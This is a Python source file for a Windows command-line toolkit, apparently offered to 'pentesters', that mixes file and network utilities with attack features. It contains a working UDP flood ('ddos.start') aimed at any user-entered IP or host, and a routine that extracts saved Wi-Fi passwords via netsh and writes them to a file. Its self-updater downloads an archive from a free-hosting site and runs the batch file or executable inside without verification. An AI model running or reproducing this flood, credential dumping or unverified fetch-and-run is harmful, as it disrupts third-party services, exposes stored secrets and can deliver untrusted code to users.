from colorama import *
from time import sleep
import os
import shutil
from time import sleep
import requests
import wget
import patoolib
import os
from getpass import getuser


def usercommand(self):
    try:

        if z == "about":
            # Shows About Info
            print("""CommandLine is an Opensource Program by Muhammad Sami Furqan.""")

        # Shows License Info.
        elif z == "license":
            import getpass
            print(f"""
This Software is licensed to {getpass.getuser()}.
|------------------------------------------------------|   
|              LICENSE INFO                            |
|              -------------                           |    
|-> From Aisoft-co.                                    |
|-> CLI Based Software.                                |  
|-> Open-Source.                                       |
|-> Version 2.0.1 * Latest *                           |
|-> Language : Python3.                                | 
|-> For Pentesters and for Ethical Hackers.            | 
|-> Type : Terminal.                                   |
|------------------------------------------------------|
""")
        # General commands
        # whoami -> Tells The Name of the current user.
        elif z == "whoami":
            import getpass
            print(getpass.getuser())

        # Exiting Console

        elif z == "exit" or z == "e":
            print("Exiting Commandline")
            quit()

        # For Clearing Console
        elif z == "clear" or z == "cls":
            import os
            # Checks about OS "REQUIRED FOR CLEARING"
            def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
            clear()  # Clears Console

        # For dislaying day and time.
        elif z == "d/t":
            import datetime
            dt = datetime.datetime.now()
            print(dt)

        # For listing directories:
        elif z == "ls":
            import os

            files = [f for f in os.listdir('.') if os.path.isfile(f)]
            for f in files:
                 print (f)
        
        elif z == "ls -a".lstrip():
            import os
            from os import listdir
            from os.path import isfile, join

            cwd = os.getcwd()
            onlyfiles = [os.path.join(cwd, f) for f in os.listdir(cwd) if
                         os.path.isfile(os.path.join(cwd, f))]
            print(onlyfiles)

        # Create a new file
        elif z == "create.file":

            import os
            a = input("Enter file name: ")
            b = input("Enter Extension: ")
            if os.path.isfile(a+b):
                print(f"{a+b} <-- File Exists")
            else:
                newf = open(str(a)+str(b), 'w')
                print(
                    f"The file named {str(a)+str(b)} is created successfully!")

        #  Delete a file:
        elif z == "del.file":

            #!/usr/bin/python
            import os

            ## Get input ##
            myfile = input("Enter file name to delete: ")

            ## Try to delete the file ##
            if myfile == "CommandLine.py":
                askdelfile = input("Do you want to delete this console from pc")
                if askdelfile == "yes":
                    print("ok removing..")
                    os.remove(myfile)
                else:
                    pass
            try:
                os.remove(myfile)
                print(f"The file named {myfile} is deleted successfully!")
            except OSError as e:  # if failed, report it back to the user ##
                print("Error: %s - %s." % (e.filename, e.strerror))

        # Updating a file in python
        elif z == "update.file":
            try:
                User3 = input("Enter file name: ")

                k = open(str(User3), 'w')
                usrinp = input("Enter Text: ")
                k.write(usrinp)
                k.close()
                print(f"The File named {User3} is updated successfully!")
            except:
                print(f"{User3} <-- File Not Found!")
        # Rename a file
        elif z == "rename.file":
            try:
                import os

                oldfilename1 = input("Enter Old File Name: ")
                oldextensionname = input("Enter Old File Exetension: ")
                newfilename1 = input("Enter New File Name: ")
                newextensionname = input("Enter New Extension Name: ")
                os.rename(oldfilename1+oldextensionname,
                          newfilename1+newextensionname)
                print(
                    f"The file named {oldfilename1+oldextensionname} has been successfully updated to {newfilename1+newextensionname}!")
            except:
                print(f"{oldfilename1}{oldextensionname} <-- File Not Found!")

        # get ip from host
        elif z == "host.getip":
            try:
                import socket
                askhost = input("Enter Host URL: ")
                convhost = socket.gethostbyname(askhost)
                print(f"The ip address of Host: {askhost} is {convhost}")
            except:
                print(f"{askhost} host ip address not found")
        # get host name from ip
        elif z == "ip.get":
            try:
                import socket
                askusrforip = input("Enter Host IP : ")
                hostipcheck = socket.gethostbyaddr(askusrforip)
                print(f"The Host of this Ip is {hostipcheck}")
            except socket.gaierror:
                print("Unknown error")
            except:
                print(f"{askusrforip} host not found")

        # ipconfiguration
        elif z == "ipcon.all":

            import subprocess
            proc = subprocess.check_output("ipconfig /all").decode('utf-8')
            print(proc)

        # Gb to Mb convertor
        elif z == "gb.mb":
            user = int(input("Enter Number in GB : "))
            if user == "1":
                print("1024")
            else:
                cdv = 1024*user
                print(cdv)

        # Mb to Gb Convertor:
        elif z == "mb.gb":
            valmb= int(input("Enter Number in MB : "))
            cf = valmb*0.0009765625
            print(cf)

        # For opening url in the browser
        elif z == "net.browse":
            import webbrowser
            thUser = input("Enter Web Url :")
            webbrowser.open(thUser)
            print(f"Opening {thUser} in Browser.")
        # Pinging Websites
        elif z == "lan.ping":
            from os import system
            Enterurl = input("Enter URL :")
            system("ping " + Enterurl)

        # Ping Constantly
        elif z == "ping.t":
            s2e4 = input("Do you want to Ping Websites :")
            if s2e4 == "y":
                try:
                    import subprocess
                    askusrtouser = input("Enter Website url : ")
                    prpc342 = subprocess.check_output(
                        "ping "+askusrtouser+" -t").decode('utf-8')
                    print(prpc342)
                except:
                    KeyboardInterrupt == print("ok")
        elif z=="terminal":
            import os
            os.system("cmd")
        # port ip scanner:=
        elif z == "lanport/scan.ip":
            import socket
            import ipaddress
            import re
            port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
            port_min = 0
            port_max = 65535
            open_ports = []
            while True:
                ip_add_entered = input(
                    "Please enter the ip address that you want to scan: ")
                try:
                    ip_address_obj = ipaddress.ip_address(ip_add_entered)
                    print("You entered a valid ip address.")
                    break
                except:
                    print("You entered an invalid ip address")
            while True:
                print(
                    "Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
                port_range = input("Enter port range: ")
                port_range_valid = port_range_pattern.search(
                    port_range.replace(" ", ""))
                if port_range_valid:
                    port_min = int(port_range_valid.group(1))
                    port_max = int(port_range_valid.group(2))
                    break
                for port in range(port_min, port_max + 1):
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(0.5)
                            s.connect((ip_add_entered, port))
                            open_ports.append(port)
                    except:
                        pass
            for port in open_ports:
                print(f"Port {port} is open on {ip_add_entered}.")

        # check network speedtest
        elif z == "net.speedtest":
         import speedtest

         def getNetSpeed():
            import speedtest
            tester = speedtest.Speedtest()

            print("Searching For The Best Server...")
            # Check for the best servers
            bestServer = tester.get_best_server()
            print(
                f'Selecting {bestServer["host"]} located in {bestServer["country"]},{bestServer["name"]}')
            # Now code for Checking Downloading Speed.
            print("Checking Downloading Speed...")
            downloadSpeed = tester.download()
            print("Done!")
            # Now code for checking Uploading Speed.
            print("Checking Uploading Speed...")
            uploadSpeed = tester.upload()
            print("Done!")
            ping = tester.results.ping
            print('Results :')
            print(f'-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s')
            print(f'-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s')
            print(f'-Ping : {ping :.2f} ms')

         for i in range(3):
                 print(getNetSpeed())
        # Winver
        elif z == "win.ver":
            import subprocess
            proc332 = subprocess.check_output("winver").decode('utf-8')

#------------------------Hacking Scripts----------------------------#
# Used Scripts like Ddos and more From github.                      #
#-------------------------------------------------------------------#
        # DDOS Attack Script
        elif z == "ddos.start":
            import sys
            import os
            import time
            import socket
            import random
            # Code Time
            from datetime import datetime
            now = datetime.now()
            hour = now.hour
            minute = now.minute
            day = now.day
            month = now.month
            year = now.year

            ##############
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            #############
            bdafa = input("""Select one
[A] DDoS using an ip address (if you already have an ip address)
[B] DDoS using host (if you dont have an ip address)

""")
            if bdafa == "A":

                try:
                    ip = input("Enter Ip address: ")

                    try:
                        port = int(input("Port       : "))
                    except:
                        print("Dont use strings in port!")

                    print(f"Starting an DDoS Attack on {ip}")
                    print("[                    ] 0% ")
                    time.sleep(2)
                    print("[=====               ] 25%")
                    time.sleep(2)
                    print("[==========          ] 50%")
                    time.sleep(2)
                    print("[===============     ] 75%")
                    time.sleep(2)
                    print("[====================] 100%")
                    time.sleep(2)
                    sent = 0
                    while True:
                        sock.sendto(bytes, (ip, port))
                        sent = sent + 1
                        port = port + 1
                        print("Sent %s packet to %s throught port:%s" %
                              (sent, ip, port))
                        if port == 65534:
                            port = 1

                except KeyboardInterrupt as exception:
                    KeyboardInterrupt == print("ok")
                except socket.gaierror as axs:
                    socket.gaierror == print(f"{ip} <-- Wrong Ip address")

            else:
                try:
                    user13232 = input("Enter Host : ")
                    ip2 = socket.gethostbyname(user13232)
                    port2 = int(input("Port       : "))
                    print(
                        f"Starting an DDoS Attack on Host {user13232} ip address is {ip2}:")
                    sent = 0
                    while True:
                        sock.sendto(bytes, (ip2, port2))
                        sent = sent + 1
                        port2 = port2 + 1
                        print("Sent %s packet to %s throught port:%s" %
                              (sent, ip2, port2))
                        if port2 == 65534:
                            port2 = 1
                except KeyboardInterrupt as exception:
                    KeyboardInterrupt == print("Process Stopped - REASON : KeyBoard Interrupt\n")
                except socket.gaierror:
                    socket.gaierror == print(
                        f"{user13232} <-- Host Not Found + No ip address Found ")

        # app updater
        elif z == "update.commandline":
            commandlineupdate()
        # gitclonner
        elif z == "git.clone":
            from git import Repo
            import os
            ask_abt_dir = input("Enter the Location(not gitlink): ")
            ask_abt_url = input("Enter repository link(git link): ")
            ask_folder_name = input("Enter the folder name(new folder to store files): ")
            combine_a = ask_abt_dir+"\\"+ask_folder_name
            Repo.clone_from(ask_abt_url, combine_a)

#-------------------Hacking Scripts---------------------------------#
        elif z == "ip.info":
            init(convert=True)
            print(f"""{Fore.BLUE}Select Options:
[A] Track by IP Address - Example [111.111.11.1]
[B] Track by Host Name - Example [www.example.com]
[C] Back
""")
            print(Fore.RED+"\t\t\t\t\t *You can use 'list' command to see all the options*")
            
            command=input(f"{Fore.RED}{getuser()}$: ")
            if command == "A":
                print(Fore.RESET)
                user_ip = input(Fore.BLUE+"ENTER IP ADDRESS: ")
                url = "http://ip-api.com/json/{0}"
                response = requests.get(url.format(user_ip)).json()
                print(Fore.RESET)
                for key in response:
                    print(Fore.GREEN+"{0: <15} - {1}".format(key, response[key])) 
            elif command == "B":
                user_host = input("ENTER HOST NAME: ")
                Host_conv = requests.get(f"http://ip-api.com/json/{user_host}").json()
                for key2 in Host_conv:
                    print("{0: <15} - {1}".format(key2, Host_conv[key2])) 
                    print("\n")
            elif command == "cls":
                os.system("cls")
            elif command == "list":
             print(f"""{Fore.BLUE}Availaible Options:
         [A] Track by IP Address - Example [111.111.11.1]
         [B] Track by Host Name - Example [www.example.com]
         [C] Exit (Exits the program)
         """)
            elif command == "C":
                  print(Fore.RESET)
                  pass
            else:
                   print(Fore.RESET)  
                   print(Fore.RED+"Wrong Command! Try Again.")
        # download youtube videos
        elif z == "pkg.youtube":
            try:
              # importing module
                import youtube_dl
                import pytube
                ydl_opts = {}

                def dwl_vid():
                    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                        ydl.download([zxt])

                channel = 1
                while (channel == int(1)):
                    link_of_the_video = input("Enter Video URL: ")
                    zxt = link_of_the_video.strip()

                    dwl_vid()
                    channel = int(
                        input("Enter 1 if you want to download more videos \nEnter 0 if you are done "))

            except KeyboardInterrupt as exception:
                KeyboardInterrupt == print("ok")

                # Mp3 youtube downloader
        elif z == "pkg.youtube.mp3":
            try:
                import youtube_dl

                def run():
                    video_url = input("Enter Video URL: ")
                    video_info = youtube_dl.YoutubeDL().extract_info(
                        url=video_url, download=False
                    )
                    filename = f"{video_info['title']}.mp3"
                    options = {
                        'format': 'bestaudio/best',
                        'keepvideo': False,
                        'outtmpl': filename,
                    }

                    with youtube_dl.YoutubeDL(options) as ydl:
                        ydl.download([video_info['webpage_url']])

                    print("Download complete... {}".format(filename))

                if __name__ == '__main__':
                    run()
            except:
                print("Unknown Error Was Found!")     
            
        # get files from internet
        elif z == "pkg.download":
            try:
                import wget
                url1 = input("Enter file url: ")
                wget.download(url1)
                print("Download is completed successfully")
            except:
                print(f"{url1} <-- Wrong Package!")

        # open files
        elif z == "open.file":
            try:
                import os
                askusrabtfile = input("Enter File Name: ")
                os.startfile(askusrabtfile)
                print(f"The file named {askusrabtfile} is opened successfully")
            except:
                print(f"{askusrabtfile} <-- File not Found!")

        # Shutdown the computer
        elif z == "shutdown.s":
            try:
                import os
                oc = input("Do you want to Shutdown this device y or n : ")
                if oc == "y":
                    os.system("shutdown /s")
                elif z == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # restartss the commputer
        elif z == "restart.s":
            try:
                import os
                g = input("Do you want to restart this device y or n: ")
                if g == "y":
                    os.system("shutdown /r")
                elif g == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # logout from the ccomputer.
        elif z == "logout.s":
            try:
                import subprocess
                fl = input("Do you want to logout y or n : ")
                if fl == "y":
                    subprocess.check_output("shutdown /l").decode('utf-8')
                elif z == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # Remote shutdown the computer:
        elif z == "remote.shutdown":
            try:
                import subprocess
                userwin = input(
                    "Do you want to remotely shutdown all the computers y or n :")
                if userwin == "y":
                    subprocess.check_output("shutdown -i").decode('utf-8')
                elif userwin == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # run python commands
        elif z == "python.run":
            import subprocess
            proc2 = subprocess.check_output("python").decode('utf-8')
            print(proc2)

        # renew all adapters
        elif z == "wlan.renew":
            import subprocess
            proc3 = subprocess.check_output("ipconfig /renew").decode('utf-8')
            print(proc3)

        # Release all adapters
        elif z == "wlan.release":
            import subprocess
            proc34 = subprocess.check_output(
                "ipconfig /release").decode('utf-8')
            print(proc34)

        # Check if Url exists
        elif z == "check.urlexists":
            import requests
            try:
                askusrabturlex = input("Enter Url:")
                response = requests.get("http://"+askusrabturlex)
                if askusrabturlex.find == "http://" or "https://" == True:
                    print("Dont use https or http!")
                else:
                    print(f" {askusrabturlex} => Url Exists")
                    auaiwtv = input(
                        f"Do you want to Visit {askusrabturlex} y or n : ")
                    if auaiwtv == "y":
                        print(f"Opening {askusrabturlex} in Browser")
                        import webbrowser
                        webbrowser.open_new_tab(askusrabturlex)
                    else:
                        print("Ok")
            except requests.ConnectionError as exception:
                print(f"{askusrabturlex} Not Exists!")

        # Show wifi passwords
        elif z == "wlan/show.pass":
            try:
                import subprocess
                import re
                command_output = subprocess.run(
                    ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                profile_names = (re.findall(
                    "All User Profile     : (.*)\r", command_output))
                wifi_list = []
                if len(profile_names) != 0:
                    for name in profile_names:
                        wifi_profile = {}
                        profile_info = subprocess.run(
                            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
                    if re.search("Security key           : Absent", profile_info):
                        pass
                    else:
                        wifi_profile["ssid"] = name
                        profile_info_pass = subprocess.run(
                            ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                        password = re.search(
                            "Key Content            : (.*)\r", profile_info_pass)
                        if password == None:
                            wifi_profile["password"] = None
                        else:
                            wifi_profile["password"] = password[1]
                        wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)
                for x in range(len(wifi_list)):
                    print(wifi_list[x])
                    savepass = input(
                        "Do you want to save these passwords y or n :")
                    if savepass == "y":
                        f = open('WlanPasswords.txt', 'w')
                        f.write(str(wifi_list[x]))
                        f.close
                        print(
                            "All the passwords are saved! Check WlanPasswords.txt for saved passwords")
                    else:
                        print("Ok")
            except:
                print("Unknown Error was Found!")
        # show script commands
        elif z == "show.scripts":
            print(""" The Availaible scripts are :
|------------------------------------------------------------|
|[*] "ddos.start" Starts an ddos Attack.                     |                                                       
|[*] "host.getip" Get ip address of host by host url.        |      
|[*] "ip.get" Gets host name from ip.                        |
|[*] "ip.info" To get IP info.                               |
|[*] "wlan/show.pass" Show Wifi passwords.                   |
|[*] "lanport/scan.ip" to scan ip address.                   |
|------------------------------------------------------------|

""")

        # show windows commands:
        elif z == "shutdown/?":
            print("""
|-----------------------------------------------|
|[*] "shutdown.s" to shutdown this pc.          |
|[*] "restart.s" to restart this pc.            |
|[*] "remote.shutdown" to remoteley shutdown pc.|
|[*] "logout.s" to logout from this pc.         |
|-----------------------------------------------|
""")

        # Show all commands:
        elif z == "showall/?":

            print("""
|--------------------------------------------------------------------|
|[*] "root.showip" for showing ip adrees of this device.             |
|[*] "wifi/nby" for all nearby located wifi.                         |
|[*] "wlan/show.pass" for getting all the Wifi Passwords.            |
|[*] "lan.ping" for pinging websites.                                |
|[*] "lanport/scan.ip" to scan ip addresses.                         |
|[*] "check.urlexists" to check if url exists.                       |
|[*] "net.browse" to open a website in a browser.                    |
|[*] "ls" to list files currently stored in this directory.          |
|[*] "ls -a" to list files currently stored in this directory.       |
|[*] "terminal" to use Windows CMD in this Terminal.                 |
|[*] "python.run" to run python if installed.                        |
|[*] "wlan.renew" to renew all adapters.                             |
|[*] "wlan.release" for releasing all the adapters.                  |
|[*] "net.speedtest" for testing network speed.                      |
|[*] "ipcon.all" for ip configuaration.                              |
|[*] "win.ver" to show current version of windows.                   |
|[*] "mb.gb" for converting Megabytes into Gigabytes .               |
|[*] "gb.mb" for converting Gigabytes into Megabytes.                |  
|[*] "update.commandline" for updating commandline.                  |
|[*] "git.clone" for cloning git repositories.                       |
|--------------------------------------------------------------------|
""")

        # Show ip address of this Machine
        elif z == "root.showip":
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            print("The ip address of this machine is "+s.getsockname()[0])
            s.close()

        # Show website ip addresses
        elif z == "net/showwebip":
            try:
                import socket as s
                host = input("Enter web URL:")
                ip = s.gethostbyname(host)
                print('The IP Address of ' + host + ' is: ' + ip)
            except s.gaierror:
                s.gaierror == print(f"{host} <-- Host Not Found!")

        # Wifi nearby:
        elif z == "wifi/nby":
            import subprocess
            devices = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'network'])
            devices = devices.decode('ascii')
            devices = devices.replace("\r", "")
            print(devices)

        # if users input is null or nothing.
        elif z == "":
            pass
        elif z == KeyboardInterrupt:
            quitdialogue = input("Do you want to quit? y or n : ")
            if quitdialogue == "y":
                print("Quitting...")
                quit()
        # Help Commands:
        elif z == "help" or z == "?":
            print("""OPTIONS TO CHOOSE WITH
|------------------------------------------------------|
|Basic Commands :-                                     |
|[*] "whoami" to see about the user.                   |
|[*] "create.file" to Create a new file.               |
|[*] "del.file" to delete a file.                      |
|[*] "rename.file" to rename a file.                   |
|[*] "open.file" to open files.                        |
|[*] "update.file" to update the file.                 |
|[*] "exit" to exit the console.                       | 
|[*] "cls" or "clear"  to clear Console.               |
|[*] "pkg.download" to download files from internet.   |
|[*] "pkg.youtube" to download videos from youtube.    |
|[*] "pkg.youtube.mp3" to download audio from youtube. |
|[*] "showall/?" to show all commands.                 |
|[*] "show.scritps" to show all scripts.               |
|[*] "shutdown/?" to show shutdown commands.           |
|------------------------------------------------------|""")

        # If user will input a  wrong command:
        else:
            print("Command not found! If you need Help use 'help' or '?'")
            return z
    except:
        user_input = input("Do you want to exit the console? y or n :")
        if user_input == "y":
            print("Exiting console...")
            exit()
def commandlineupdate():
    try:
       versionquery = "2.0.1"
       request = requests.get('https://pastebin.com/1tpj8vpk')
       if ("2w.0e.2s" in request.text):
           if (versionquery =="2w.0e.2s"):
               print("Update Not Availaible\n")
           else:
               print("Update Availaible\n")
               ask_to_update = input("Do you want to update? (Y/N): ")
               if ask_to_update == "Y":
                   wget.download("https://allpetsworld.000webhostapp.com/commandlinedownload/CommandLine.rar")
                   print("\n")
                   print(f"Creating a New Directory named CommandLineDownload...\n")
                   sleep(1)
                   os.mkdir("CommandLineDownload")
                   sleep(2)
                   print("Extracting the Downloaded files...\n")
                   current_dir = os.getcwd()
                   patoolib.extract_archive(
                       "CommandLine.rar", outdir=current_dir+"\\CommandLineDownload")
                   sleep(1)
                   print("Extraction Successful\n")
                   sleep(1)
                   print("Running the Setup File...\n")
                   sleep(1)
                   try:
                       os.startfile(current_dir+"\\CommandLineDownload\\AutoInstall.bat")
                   except:
                     try:  
                       os.startfile(current_dir+"\\CommandLineDownload\\CommandLine.exe")
                       sleep(10)
                       os.startfile(current_dir+"\\CommandLineDownload\\Commands.chm")
                     except OSError as e:
                         print("Opertation cancelled\n")
                   ask_to_delete = input("Do you want to delete the downloaded files? (Y/N): ")
                   if ask_to_delete == "Y":
                       shutil.rmtree("CommandLineDownload")
                       try:  
                           os.remove("CommandLine.rar")
                       except:  
                           print("Deletion Successful\n")
                           sleep(2)
                   else:
                       print("Deletion Cancelled\n")
                       
               else:
                   print("OK -- Skipped Update 2.0.2 | -> use 'update.commandline' to Update to Latest Version\n")
       else:
          print("Update Not Availaible\n")
    except:
            pass        
    

if __name__ == "__main__":
    try:
        print("Checking for updates...")
        print("\n")
        print("Please be Patient...")
        commandlineupdate()
        sleep(2)
        print("Clearing the Console...")
        os.system("cls")
    except:
        pass
    while True:

        try:
            import getpass
            z = input(f"{getpass.getuser()} ~$: ").strip()
            c = usercommand(z)
        except KeyboardInterrupt:
            
            while KeyboardInterrupt:
              try:
                ask_to_exit = input("Do you want to exit the console? y or n :\n")
                if ask_to_exit == "y":
                    quit()
                else:
                    break
                    
              except KeyboardInterrupt:
                  break
              except EOFError as e:
               pass
          
                  
        except IOError as op:
            print(f"{op}")
        except ValueError as VE:
            exit()
